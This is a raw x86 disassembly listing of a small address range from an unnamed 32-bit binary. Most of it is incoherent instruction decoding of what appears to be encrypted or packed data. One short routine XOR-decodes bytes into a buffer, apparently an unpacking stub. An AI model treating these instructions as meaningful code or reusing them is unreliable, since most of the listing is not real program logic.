  4124bf:	add    al,0xa6
  4124c1:	or     BYTE PTR [esi],0x12
  4124c4:	aam    0xf8
  4124c6:	mov    esp,0xfb230a98
  4124cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124cc:	or     al,0xe3
  4124ce:	push   ebx
  4124cf:	fild   DWORD PTR ds:0x773d3e33
  4124d5:	ja     0x412540
  4124d7:	mov    ds:0x8726df94,eax
  4124dc:	ins    BYTE PTR es:[edi],dx
  4124dd:	jle    0x412461
  4124df:	(bad)  [eax]
  4124e1:	push   ebx
  4124e2:	dec    esp
  4124e3:	or     al,0x84
  4124e5:	jae    0x412491
  4124e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e8:	cmp    al,0x1b
  4124ea:	dec    ebp
  4124eb:	xchg   dl,dl
  4124ed:	sbb    eax,0x12ba0350
  4124f2:	repz inc esi
  4124f4:	mov    dl,0x32
  4124f6:	or     BYTE PTR [ebp-0x35e0c99c],bl
  4124fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124fd:	and    al,0x8
  4124ff:	jge    0x412513
  412501:	fstp   QWORD PTR [ebp+0x4c]
  412504:	mov    al,0x7d
  412506:	inc    edx
  412507:	out    dx,eax
  412508:	xchg   BYTE PTR [edx],cl
  41250a:	adc    al,0x87
  41250c:	or     BYTE PTR [ebx-0x153e86aa],dh
  412512:	push   ebp
  412514:	dec    ecx
  412515:	push   ds
  412516:	adc    edi,DWORD PTR [ebp-0x34731a28]
  41251c:	xchg   edi,eax
  41251d:	pop    ss
  41251e:	fwait
  41251f:	ret    
  412520:	jb     0x41251d
  412522:	jne    0x4124ce
  412524:	rcl    DWORD PTR [esi],cl
  412526:	pop    ss
  412527:	or     eax,DWORD PTR [edi-0x78]
  41252a:	sbb    cl,BYTE PTR [esi+eiz*4]
  41252d:	imul   BYTE PTR [edi+ebp*1-0x2b]
  412531:	stos   DWORD PTR es:[edi],eax
  412532:	xchg   esi,eax
  412533:	cs rcl bl,1
  412536:	fbstp  TBYTE PTR [edi+0x1f]
  412539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41253a:	or     eax,0x9a8df7e1
  41253f:	std    
  412540:	pop    ecx
  412541:	xor    DWORD PTR [ecx-0x34],ecx
  412544:	jl     0x41252c
  412546:	jbe    0x412578
  412548:	cld    
  412549:	or     al,0x7e
  41254b:	xchg   esi,eax
  41254c:	inc    esp
  41254d:	loopne 0x41252e
  41254f:	mov    dh,0xb8
  412551:	ins    BYTE PTR es:[edi],dx
  412552:	xor    ah,BYTE PTR [ecx-0x5b]
  412555:	or     ah,BYTE PTR [ecx-0x5a]
  412558:	mov    edi,0x3a105416
  41255d:	cld    
  41255e:	cmp    al,0x41
  412560:	in     eax,dx
  412561:	dec    esi
  412562:	jl     0x4124ff
  412564:	arpl   dx,dx
  412566:	mov    eax,0x6ca8d0b9
  41256b:	xor    eax,0x3d566919
  412570:	stc    
  412571:	aaa    
  412572:	dec    esp
  412573:	int3   
  412574:	or     eax,0x39722909
  412579:	mov    ebx,edi
  41257b:	jmp    0x5cdf:0x781e8ace
  412582:	inc    edx
  412583:	mov    al,ds:0xe1c1a552
  412588:	dec    ebx
  412589:	cmp    ebx,eax
  41258b:	xchg   ebx,eax
  41258c:	jg     0x41254a
  41258e:	inc    esp
  41258f:	iret   
  412590:	test   al,0x4b
  412592:	jmp    esp
  412594:	or     BYTE PTR [ebp-0x515fa0a7],dh
  41259a:	mov    ch,0xa5
  41259c:	adc    eax,0xef344e0d
  4125a1:	sub    eax,0xb19b5bda
  4125a6:	and    al,0x1e
  4125a8:	mov    ah,0xbe
  4125aa:	mov    BYTE PTR [eax+0x29],dl
  4125ad:	fisttp DWORD PTR ds:0xf89a09f0
  4125b3:	push   eax
  4125b4:	mov    ecx,0x940b05a6
  4125b9:	nop
  4125ba:	dec    eax
  4125bb:	push   edx
  4125bc:	or     esp,eax
  4125be:	pop    ss
  4125bf:	dec    edi
  4125c0:	jg     0x4125e9
  4125c2:	mov    bl,0xa8
  4125c4:	dec    edi
  4125c5:	outs   dx,BYTE PTR ds:[esi]
  4125c6:	adc    BYTE PTR [edx-0x4c],0x3f
  4125ca:	sub    esi,DWORD PTR [esi-0x59e5b9f1]
  4125d0:	dec    ebx
  4125d1:	add    ch,BYTE PTR ds:0xfadc2d01
  4125d7:	inc    ebp
  4125d8:	pop    esp
  4125d9:	mov    cl,0xa
  4125db:	cld    
  4125dc:	je     0x41257d
  4125de:	add    eax,0x50fc7273
  4125e3:	mov    ch,BYTE PTR [edi-0x28746a04]
  4125e9:	jae    0x4125f3
  4125eb:	cdq    
  4125ec:	push   edx
  4125ed:	cld    
  4125ee:	push   ss
  4125ef:	pop    DWORD PTR [esi+ebp*4+0x24]
  4125f3:	inc    eax
  4125f4:	mov    al,0x86
  4125f6:	stc    
  4125f7:	inc    esp
  4125f8:	inc    edx
  4125f9:	push   esi
  4125fa:	sub    dh,BYTE PTR [edx-0x64]
  4125fd:	aas    
  4125fe:	add    BYTE PTR [ebx],al
  412600:	repnz cs out 0x69,eax
  412604:	test   esi,eax
  412606:	push   cs
  412607:	xadd   BYTE PTR [ebx+0x6066e423],al
  41260e:	shl    DWORD PTR ds:0xb6ddb806,0x34
  412615:	sqrtps xmm2,XMMWORD PTR [eax]
  412618:	xchg   ebx,eax
  412619:	test   ebx,eax
  41261b:	mov    edi,ss
  41261d:	pushf  
  41261e:	push   ecx
  41261f:	mov    ebx,0xf291a60b
  412624:	out    dx,eax
  412625:	sub    esi,edi
  412627:	mov    ebx,0x5d4f530
  41262c:	jecxz  0x412620
  41262e:	loope  0x412668
  412630:	(bad)  
  412631:	push   ecx
  412632:	test   BYTE PTR [edx-0x66],bl
  412635:	mov    al,ds:0xb5d11f35
  41263a:	popw   ds
  41263c:	pushf  
  41263d:	fisubr WORD PTR [eax]
  41263f:	pusha  
  412640:	jle    0x412675
  412642:	push   ss
  412643:	and    eax,0x6fc70368
  412648:	jbe    0x4125cf
  41264a:	retf   
  41264b:	enter  0x104c,0xff
  41264f:	(bad)  
  412650:	mov    cs,WORD PTR [edi]
  412652:	mov    dh,0xe0
  412654:	fmul   DWORD PTR [eax]
  412656:	pop    eax
  412657:	in     al,dx
  412658:	cmp    al,0x7a
  41265a:	enter  0xc01f,0x2c
  41265e:	mov    DWORD PTR [eax+esi*8-0x647d2f53],ebp
  412665:	cmp    DWORD PTR [ebp*1-0x2cf56bf5],0x277b6b5e
  412670:	or     al,0x49
  412672:	jne    0x412602
  412674:	pusha  
  412675:	(bad)  
  412676:	mov    ch,0x7d
  412678:	push   ecx
  412679:	cmp    dl,bl
  41267b:	mov    es,WORD PTR [edi]
  41267d:	ret    0x8958
  412680:	sti    
  412681:	addr16 dec edx
  412683:	or     BYTE PTR [esi],0xf5
  412686:	aas    
  412687:	(bad)  
  41268b:	sbb    eax,0x205f3e67
  412690:	inc    edi
  412691:	pop    ss
  412692:	push   ebx
  412693:	imul   edi,esi,0xffbc1627
  412699:	push   ss
  41269a:	jo     0x412655
  41269c:	jne    0x4126b8
  4126a2:	xor    eax,esi
  4126a4:	add    eax,edi
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0x2d
  412711:	push   ss
  412712:	in     eax,dx
  412713:	inc    DWORD PTR [edi+0x6a]
  412716:	bound  esp,QWORD PTR [edx+0xa]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx+0x6e]
  41271d:	in     eax,dx
  41271e:	add    ah,BYTE PTR [ecx-0x57]
  412721:	sbb    edx,DWORD PTR [eax]
  412723:	and    eax,0x5bb3e84e
  412728:	pop    ecx
  412729:	popf   
  41272a:	scas   al,BYTE PTR es:[edi]
  41272b:	and    al,0x46
  41272d:	hlt    
  41272e:	jo     0x412726
  412730:	pop    edi
  412731:	add    DWORD PTR [edi-0x18e64f15],0x60896e1e
  41273b:	cmp    dh,BYTE PTR [esi+0x3f]
  41273e:	inc    ebx
  41273f:	js     0x4127a8
  412741:	fcomp  QWORD PTR [ebp-0x64e1d016]
  412747:	ins    DWORD PTR es:[edi],dx
  412748:	retf   0x7e3e
  41274b:	repz fisub DWORD PTR [eax-0x27]
  41274f:	or     BYTE PTR [eax+0x6a],ch
  412752:	lea    esp,[ebx+0x2690c18b]
  412758:	pop    ebx
  412759:	test   eax,0xa19c545a
  41275e:	cmp    eax,0xab562d7c
  412763:	ficomp DWORD PTR [edx-0x6c]
  412766:	xchg   edi,ebp
  412768:	and    al,0x41
  41276a:	cmp    ebx,ebx
  41276c:	push   esi
  41276d:	mov    ds:0xee408502,eax
  412772:	push   0xffffff8a
  412774:	dec    edi
  412775:	mov    eax,0xb1585b8f
  41277a:	aas    
  41277b:	retf   
  41277c:	sahf   
  41277d:	or     ebp,edi
  41277f:	fwait
  412780:	lods   eax,DWORD PTR ds:[esi]
  412781:	pop    esi
  412782:	lds    esi,FWORD PTR [ebx-0x36]
  412785:	in     eax,0x15
  412787:	ret    
  412788:	pop    edx
  412789:	and    DWORD PTR [edi],0xad3e1576
  41278f:	inc    edx
  412790:	fsubr  QWORD PTR [esi]
  412792:	jo     0x4127cb
  412794:	lock hlt 
  412796:	ins    DWORD PTR es:[edi],dx
  412797:	retf   0xb007
  41279a:	mov    esi,0x836b698f
  41279f:	popa   
  4127a0:	xchg   edx,eax
  4127a1:	jo     0x4127a4
  4127a3:	dec    esp
  4127a4:	ffreep st(3)
  4127a6:	jl     0x412737
  4127a8:	adc    BYTE PTR [ebp+0x41],dl
  4127ab:	jne    0x412818
  4127ad:	and    al,0x4d
  4127af:	sub    DWORD PTR [ecx+edi*1+0xde0f00c],esp
  4127b6:	cwde   
  4127b7:	sub    ch,bh
  4127b9:	or     ecx,edi
  4127bb:	test   BYTE PTR [eax+0x21aaf306],0x1f
  4127c2:	dec    ebp
  4127c3:	jg     0x41279e
  4127c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127c6:	mov    ah,0x4
  4127c8:	push   ds
  4127c9:	lods   al,BYTE PTR ds:[esi]
  4127ca:	sub    bl,al
  4127cc:	inc    esp
  4127cd:	call   esi
  4127cf:	fild   WORD PTR [edi+0x4f86652e]
  4127d5:	fdivr  st,st(1)
  4127d7:	imul   ebp,DWORD PTR [edi],0xffffffd3
  4127da:	(bad)  
  4127db:	fnstcw WORD PTR [ebx+esi*8-0x10e3558f]
  4127e2:	jnp    0x412835
  4127e4:	hlt    
  4127e5:	ja     0x41282f
  4127e7:	loope  0x412830
  4127e9:	sub    DWORD PTR [esi+0x4dbb2267],ebx
  4127ef:	rol    DWORD PTR [ecx],0xfa
  4127f2:	xor    ebx,eax
  4127f4:	sub    esi,DWORD PTR [edx-0x2c]
  4127f7:	or     bl,BYTE PTR [edx]
  4127f9:	cmp    al,0xc0
  4127fb:	pop    ecx
  4127fc:	adc    bl,BYTE PTR [ecx-0x28ca0ba4]
  412802:	adc    eax,0x90b4423f
  412807:	daa    
  412808:	mov    fs,WORD PTR [edx-0x7174d8a]
  41280e:	(bad)  
  41280f:	jmp    0xb8e9:0x2b2f0dcf
  412816:	(bad)  
  412818:	or     DWORD PTR [esi+0x59567735],ecx
  41281e:	ins    BYTE PTR es:[edi],dx
  41281f:	push   ds
  412820:	xchg   esp,eax
  412821:	mov    ch,0x89
  412823:	mov    ch,0x16
  412825:	fsub   QWORD PTR ds:0xe70c6518
  41282b:	fcom   DWORD PTR [ebx]
  41282d:	pushf  
  41282e:	push   ss
  41282f:	not    BYTE PTR [edi-0x2e]
  412832:	adc    al,0xa4
  412834:	repnz fild QWORD PTR [ebx]
  412837:	pop    ss
  412838:	dec    edi
  412839:	pop    edi
  41283a:	mov    dl,0xac
  41283c:	icebp  
  41283d:	dec    eax
  41283e:	add    BYTE PTR [eax-0xb2099a6],ch
  412844:	sbb    DWORD PTR [edi],esp
  412846:	jp     0x412883
  412848:	jne    0x412806
  41284a:	adc    DWORD PTR [edx-0x34],ecx
  41284d:	push   edi
  41284e:	jecxz  0x41286d
  412850:	cwde   
  412851:	arpl   WORD PTR [edx+ecx*1-0x734baa68],sp
  412858:	or     eax,0x1ac15bf6
  41285d:	and    ebp,DWORD PTR ds:0xb7031f98
  412863:	je     0x4128c2
  412865:	callw  0xbea1
  412869:	push   edi
  41286a:	cmp    DWORD PTR [eax],ebp
  41286c:	jnp    0x412812
  41286e:	retf   
  41286f:	imul   edx,DWORD PTR [edi],0xffffff9e
  412872:	pop    esp
  412873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412874:	xchg   esi,eax
  412875:	sbb    al,0xd0
  412877:	retf   0xb0d7
  41287a:	ins    DWORD PTR es:[edi],dx
  41287b:	dec    edx
  41287c:	stc    
  41287d:	inc    esi
  41287e:	mov    dh,BYTE PTR [ebx+ebx*8-0x72]
  412882:	ins    DWORD PTR es:[edi],dx
  412883:	loop   0x41285a
  412885:	mov    ch,0x55
  412887:	mov    ds:0x5799af14,al
  41288c:	push   eax
  41288d:	repz cmp eax,0xf0537f0
  412893:	mov    DWORD PTR es:[ecx+0x2f],eax
  412897:	stos   DWORD PTR es:[edi],eax
  412898:	ret    0xe41b
  41289b:	pop    es
  41289c:	test   eax,0xaf414932
  4128a1:	std    
  4128a2:	adc    dx,WORD PTR [ebx+0x5b]
  4128a6:	cdq    
  4128a7:	xlat   BYTE PTR ds:[ebx]
  4128a8:	jmp    0x3312c3ca
  4128ad:	mov    bl,0x17
  4128af:	imul   eax,DWORD PTR [ecx-0x65],0xffffffb4
  4128b3:	xor    esi,DWORD PTR [ebx+0x49]
  4128b6:	mov    ebx,0xb15c7d1b
  4128bb:	loopne 0x4128f3
  4128bd:	mov    edx,eax
  4128bf:	add    al,0x9b
  4128c1:	inc    esi
  4128c2:	loopne 0x4128bd
  4128c4:	(bad)  
  4128c5:	cld    
  4128c6:	xor    eax,0x19481124
  4128cb:	invd   
  4128cd:	nop
  4128ce:	push   esi
  4128cf:	cmp    al,0xe2
  4128d1:	inc    ecx
  4128d2:	rcr    BYTE PTR [edi],0x1f
  4128d5:	(bad)  
  4128d7:	nop
  4128d8:	jnp    0x4128cd
  4128da:	xor    al,0x6c
  4128dc:	(bad)  
  4128de:	fdiv   QWORD PTR ds:[eax+0x2e47e16d]
  4128e5:	pop    ss
  4128e6:	dec    esp
  4128e7:	push   ss
  4128e8:	mov    dl,0xc8
  4128ea:	aam    0xe3
  4128ec:	fldenv [eax-0x365c492]
  4128f2:	mov    esi,0x91f7f183
  4128f7:	xchg   ebp,eax
  4128f8:	cmp    eax,0xa9f73834
  4128fd:	rcr    BYTE PTR [esi+0x25],1
  412900:	jecxz  0x4128ba
  412902:	mov    BYTE PTR [esi-0x176caf87],cl
  412908:	mov    ah,0x32
  41290a:	loopne 0x412896
  41290c:	xlat   BYTE PTR ds:[ebx]
  41290d:	pop    es
  41290e:	ja     0x412937
  412910:	shl    BYTE PTR [ecx+0x46],cl
  412913:	into   
  412914:	or     DWORD PTR [eax+edx*4+0x13],edi
  412918:	je     0x412958
  41291a:	fcomp  st(2)
  41291c:	jns    0x41294e
  41291e:	das    
  41291f:	lods   al,BYTE PTR ds:[esi]
  412920:	dec    ebp
  412921:	mov    cs,WORD PTR ds:0x8a040a21
  412927:	ret    0xa089
  41292a:	out    0xeb,eax
  41292c:	out    dx,al
  41292d:	retf   0x5d84
  412930:	call   0xc161:0x6e007d4
  412937:	push   edi
  412938:	js     0x412978
  41293a:	dec    edi
  41293b:	mov    ebx,0x126fdbe5
  412940:	out    dx,al
  412941:	rcl    DWORD PTR [ecx+esi*2-0x6d98e494],0x41
  412949:	icebp  
  41294a:	or     esi,DWORD PTR [ebx-0x7b]
  41294d:	sbb    al,BYTE PTR [edx]
  41294f:	inc    edi
  412950:	lds    ecx,FWORD PTR [eax-0x5e1c0a63]
  412956:	adc    bh,dh
  412958:	repz dec ebp
  41295a:	and    ah,BYTE PTR [esi-0x55]
  41295d:	stos   DWORD PTR es:[edi],eax
  41295e:	or     DWORD PTR [eax-0x7e],edx
  412961:	mov    dl,0xeb
  412963:	or     al,0x18
  412965:	and    eax,DWORD PTR [ecx+0x7f]
  412968:	mov    ebx,0x5f3dec68
  41296d:	dec    esp
  41296e:	sub    eax,0x1295700a
  412973:	sub    eax,0x9303faa2
  412978:	and    eax,0x7c50c295
  41297d:	mov    ah,0x49
  41297f:	sbb    eax,0xb80ede82
  412984:	or     esp,DWORD PTR [ebp+0x1527dc7]
  41298a:	xor    DWORD PTR [edx],0x65
  41298d:	add    bh,BYTE PTR [ecx]
  41298f:	addr16 aam 0xa5
  412992:	shrd   esp,esp,0xc2
  412996:	mov    cs,ebp
  412998:	mov    bh,0x93
  41299a:	pop    esp
  41299b:	push   ecx
  41299c:	jno    0x412956
  41299e:	stos   BYTE PTR es:[edi],al
  41299f:	ins    DWORD PTR es:[edi],dx
  4129a0:	daa    
  4129a1:	ins    BYTE PTR es:[edi],dx
  4129a2:	mov    ah,0xff
  4129a4:	pop    ebx
  4129a5:	lahf   
  4129a6:	out    dx,eax
  4129a7:	(bad)  
  4129a8:	xchg   esp,eax
  4129a9:	loopne 0x41298e
  4129ab:	xchg   BYTE PTR [ebp+0x8],bh
  4129ae:	sbb    bl,BYTE PTR [edi+esi*2+0x3]
  4129b2:	addr16 enter 0xc256,0x54
  4129b7:	cmp    esi,DWORD PTR [edi+edi*4]
  4129ba:	and    eax,0xa7166073
  4129bf:	call   0xb0457d13
  4129c4:	fcom   QWORD PTR [edx-0x6c]
  4129c7:	mov    dl,0x77
  4129c9:	mov    al,0x46
  4129cb:	push   0x6a
  4129cd:	ret    
  4129ce:	pusha  
  4129cf:	icebp  
  4129d0:	es push 0xeb17ba0
  4129d6:	dec    eax
  4129d7:	xor    esi,DWORD PTR [edx]
  4129d9:	aaa    
  4129da:	xor    eax,0xf83effb2
  4129df:	call   0xdb6e:0xdc7e2468
  4129e6:	pop    edi
  4129e7:	mov    fs,ecx
  4129e9:	call   0x844d:0xe186e140
  4129f0:	shr    BYTE PTR [edi-0x194c6c63],0xf2
  4129f7:	adc    ebx,DWORD PTR ds:0xa48d8922
  4129fd:	xor    ch,BYTE PTR [edx-0x31]
  412a00:	cmp    al,bh
  412a02:	sub    bl,BYTE PTR [ebx]
  412a04:	iret   
  412a05:	stos   DWORD PTR es:[edi],eax
  412a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a07:	pusha  
  412a08:	jmp    0xadc4:0xca71ba64
  412a0f:	push   edi
  412a10:	xor    eax,0x823c2779
  412a15:	test   al,ch
  412a17:	pop    ds
  412a18:	inc    edx
  412a19:	mov    esi,0xe86b3149
  412a1e:	or     DWORD PTR [edx],ebp
  412a20:	xor    eax,0xe36a62d0
  412a25:	jne    0x412a68
  412a27:	into   
  412a28:	and    cl,dl
  412a2a:	add    bl,bl
  412a2c:	xchg   bh,al
  412a2e:	stos   DWORD PTR es:[edi],eax
  412a2f:	inc    ebp
  412a30:	mov    ah,0x2e
  412a32:	pop    ss
  412a33:	fsubrp st(1),st
  412a35:	sub    DWORD PTR [edi],0xffffff9f
  412a38:	xchg   esp,eax
  412a3a:	dec    edx
  412a3b:	lods   al,BYTE PTR ds:[esi]
  412a3c:	sbb    edx,edi
  412a3e:	popa   
  412a3f:	mov    edi,0x1f0f6914
  412a44:	popa   
  412a45:	jge    0x412aa8
  412a47:	mov    bh,0xc3
  412a49:	into   
  412a4a:	hlt    
  412a4b:	bound  ebp,QWORD PTR [edi-0x6fdcae50]
  412a51:	int    0xbe
  412a53:	push   ebx
  412a54:	je     0x412a35
  412a56:	jp     0x412ac7
  412a58:	jae    0x412acf
  412a5a:	ret    
  412a5b:	inc    edx
  412a5c:	into   
  412a5d:	mov    dh,BYTE PTR [esi+ebp*4]
  412a60:	xor    DWORD PTR [ebp-0x4015f150],esi
  412a66:	je     0x412a61
  412a68:	mov    ch,0xa6
  412a6a:	pop    ax
  412a6c:	ret    0xe5ee
  412a6f:	aaa    
  412a70:	mov    edx,ebp
  412a72:	adc    dl,0x68
  412a75:	mov    dl,0x66
  412a77:	lods   al,BYTE PTR ds:[esi]
  412a78:	or     eax,0xa91a2a7b
  412a7d:	sbb    eax,0xd5affcb6
  412a82:	in     al,0x17
  412a84:	and    BYTE PTR cs:[eax],0xd3
  412a88:	jmp    0x9f88:0x36cfb23a
  412a8f:	xor    bl,BYTE PTR [ecx-0x6877bf5d]
  412a95:	jnp    0x412a9b
  412a97:	add    eax,0x21ecf4fc
  412a9c:	imul   edi,DWORD PTR [eax-0x19],0xffffff9d
  412aa0:	and    DWORD PTR [edi+0x2f57d085],ecx
  412aa6:	int3   
  412aa7:	dec    ecx
  412aa8:	loopne 0x412a64
  412aaa:	sbb    BYTE PTR [edi],ch
  412aac:	sbb    al,BYTE PTR [ecx-0x2a]
  412aaf:	cmp    esp,esi
  412ab1:	inc    edx
  412ab2:	mov    esi,ebx
  412ab4:	dec    eax
  412ab5:	dec    ebp
  412ab6:	mov    esi,ebx
  412ab8:	pop    eax
  412ab9:	mov    ecx,0xb5ae7b28
  412abe:	retf   0xfdea
  412ac1:	lds    esp,FWORD PTR [eax]
  412ac3:	sub    BYTE PTR [esi-0x31],bl
  412ac6:	loopne 0x412ae2
  412ac8:	(bad)  
  412ac9:	sub    cl,BYTE PTR [esi-0x5b]
  412acc:	jmp    0x412a87
  412ace:	pop    ebp
  412acf:	dec    ebp
  412ad0:	pop    esp
  412ad1:	or     BYTE PTR [edi-0x66e93d11],0x89
  412ad8:	aam    0x84
  412ada:	into   
  412adb:	push   0x2e
  412add:	sub    al,BYTE PTR [edi-0x7d6215c6]
  412ae3:	add    eax,0x5c3a01fb
  412ae8:	popa   
  412ae9:	mov    bh,0x6
  412aeb:	xlat   BYTE PTR ds:[ebx]
  412aec:	aaa    
  412aed:	call   0xd0d74961
  412af2:	addr16 popf 
  412af4:	push   esi
  412af5:	je     0x412b45
  412af7:	mov    esi,0x3d67f5b2
  412afc:	scas   al,BYTE PTR es:[edi]
  412afd:	ins    DWORD PTR es:[edi],dx
  412afe:	add    bl,BYTE PTR [edx+0x11]
  412b01:	lea    esi,[edi+0x349b2cf]
  412b07:	fadd   QWORD PTR [edx+edi*8+0x7f962f72]
  412b0e:	or     BYTE PTR [ecx+0x68a693d5],ah
  412b14:	cmc    
  412b15:	arpl   WORD PTR [ebp+eax*2+0x4951c64],dx
  412b1c:	sbb    DWORD PTR ds:0x9e3ab679,edi
  412b22:	sbb    al,0x56
  412b24:	lahf   
  412b25:	or     al,0xc8
  412b27:	push   ds
  412b28:	jecxz  0x412b47
  412b2a:	pop    ebp
  412b2b:	and    al,BYTE PTR [esi]
  412b2d:	lock std 
  412b2f:	test   BYTE PTR [edi+0x4000b285],dl
  412b35:	jnp    0x412b4d
  412b37:	pushf  
  412b38:	jmp    0xd7d2:0xe512c3ee
  412b3f:	leave  
  412b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b41:	dec    edx
  412b42:	mov    eax,0xb3be901d
  412b47:	cmp    DWORD PTR [ebp-0x41d7bb91],eax
  412b4d:	adc    al,bl
  412b4f:	popa   
  412b50:	aam    0xa5
  412b52:	mov    ecx,0xcbdbb673
  412b57:	gs pop eax
  412b59:	push   ds
  412b5a:	adc    eax,0x3b297de6
  412b5f:	ins    DWORD PTR es:[edi],dx
  412b60:	xor    eax,0x8616cf26
  412b65:	imul   eax,DWORD PTR [edi+0x9],0xffffffa5
  412b69:	call   0x5910:0x7738b57d
  412b70:	clc    
  412b71:	arpl   WORD PTR [edi+0x79cc296d],bp
  412b77:	add    eax,0xde1cd792
  412b7c:	call   0xcb4a:0xf38adf7b
  412b83:	lea    edi,[ebx-0xa]
  412b86:	inc    ebx
  412b87:	push   cs
  412b88:	jns    0x412b28
  412b8a:	jnp    0x412b5b
  412b8c:	mov    ebx,0x13e6e2a1
  412b91:	sahf   
  412b92:	push   0xffffffd6
  412b94:	les    ecx,FWORD PTR [esi+0x3945d72d]
  412b9a:	adc    dl,ch
  412b9c:	leave  
  412b9d:	imul   edx,DWORD PTR [ecx-0x4d],0xffffffcf
  412ba1:	lahf   
  412ba2:	mov    al,0x77
  412ba4:	iret   
  412ba5:	mov    edi,DWORD PTR [ecx-0x7e]
  412ba8:	hlt    
  412ba9:	lahf   
  412baa:	(bad)  
  412bab:	iret   
  412bac:	xlat   BYTE PTR ds:[ebx]
  412bad:	push   0xfac2da0d
  412bb2:	sub    bh,BYTE PTR [ebx]
  412bb4:	ins    BYTE PTR es:[edi],dx
  412bb5:	pop    ebp
  412bb6:	rcl    DWORD PTR [edi-0x162f692d],cl
  412bbc:	mov    ecx,0x87ab3405
  412bc1:	xchg   ebx,eax
  412bc2:	xor    al,BYTE PTR [eax-0x1a]
  412bc5:	dec    esi
  412bc6:	pop    DWORD PTR [edi-0x47bc1662]
  412bcc:	mov    ch,0x68
  412bce:	sub    edx,DWORD PTR [esi-0x1e]
  412bd1:	stos   BYTE PTR es:[edi],al
  412bd2:	mul    dh
  412bd4:	(bad)  
  412bd5:	into   
  412bd6:	aaa    
  412bd7:	push   0xffffffdd
  412bd9:	inc    ebp
  412bda:	out    0x72,al
  412bdc:	mov    ?,WORD PTR [ebp+0x12b3e25f]
  412be2:	hlt    
  412be3:	and    DWORD PTR [ecx-0x4206e17d],esp
  412be9:	in     eax,dx
  412bea:	or     bl,ch
  412bec:	or     BYTE PTR [ecx-0x69344224],dl
  412bf2:	inc    edi
  412bf3:	xchg   ebx,eax
  412bf4:	jle    0x412c18
  412bf6:	mov    ebx,0x594a1740
  412bfb:	dec    eax
  412bfc:	fnstcw WORD PTR [ebp-0x5e]
  412bff:	sbb    BYTE PTR [ebx-0x3b437bd9],0x5c
  412c06:	repnz mov ecx,0xc924bc0d
  412c0c:	inc    eax
  412c0d:	repnz push 0x52bdfde1
  412c13:	test   eax,0x607a3c98
  412c18:	push   cs
  412c19:	imul   edx,DWORD PTR [esi+0x781db540],0x27
  412c20:	inc    edx
  412c21:	inc    ebx
  412c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c23:	or     eax,0x8ac73b0d
  412c28:	fidivr DWORD PTR [edi]
  412c2a:	and    dh,ah
  412c2c:	sub    cl,0xe8
  412c2f:	adc    DWORD PTR [ebx+0x7a173bcd],edi
  412c35:	sahf   
  412c36:	lea    esp,[eax+0x5e]
  412c39:	push   es
  412c3a:	mov    gs,WORD PTR es:[esi]
  412c3d:	dec    ebp
  412c3e:	cmp    dl,cl
  412c40:	rcr    DWORD PTR [ebp+0x38aa1318],cl
  412c46:	xor    BYTE PTR [eax-0x2e],bh
  412c49:	push   esp
  412c4a:	call   0xdea28017
  412c4f:	jle    0x412ca2
  412c51:	sub    eax,ebx
  412c53:	scas   eax,DWORD PTR es:[edi]
  412c54:	call   DWORD PTR [eax]
  412c56:	jnp    0x412c1a
  412c58:	outs   dx,DWORD PTR ds:[esi]
  412c59:	jnp    0x412cd0
  412c5b:	popf   
  412c5c:	call   DWORD PTR [ebx]
  412c5e:	(bad)  
  412c5f:	or     al,0xac
  412c61:	outs   dx,DWORD PTR ds:[esi]
  412c62:	enter  0xa258,0x7
  412c66:	stos   BYTE PTR es:[edi],al
  412c67:	lahf   
  412c68:	xor    ebp,DWORD PTR [eax-0x32]
  412c6b:	test   BYTE PTR [ecx],al
  412c6d:	cmp    eax,0x6964f7a
  412c72:	lea    ebp,[eax+edi*8-0x6d]
  412c76:	sbb    BYTE PTR ds:[eax-0x35],bl
  412c7a:	ds scas al,BYTE PTR es:[edi]
  412c7c:	sub    BYTE PTR [ebx-0x53],bl
  412c7f:	out    0xb2,al
  412c81:	ja     0x412c63
  412c83:	mov    edx,0x25498d07
  412c88:	mov    eax,0x4af36399
  412c8d:	lods   eax,DWORD PTR ds:[esi]
  412c8e:	arpl   di,bp
  412c90:	add    eax,0xd0f7a2c6
  412c95:	sti    
  412c96:	imul   eax,DWORD PTR [ecx],0x77
  412c99:	inc    esp
  412c9a:	mov    dl,0x72
  412c9c:	mov    ds:0xf601cd72,al
  412ca1:	sbb    BYTE PTR [edi-0x23],ah
  412ca4:	jbe    0x412cd9
  412ca6:	add    ah,BYTE PTR [ebp+0x1ccbe3c7]
  412cac:	in     eax,dx
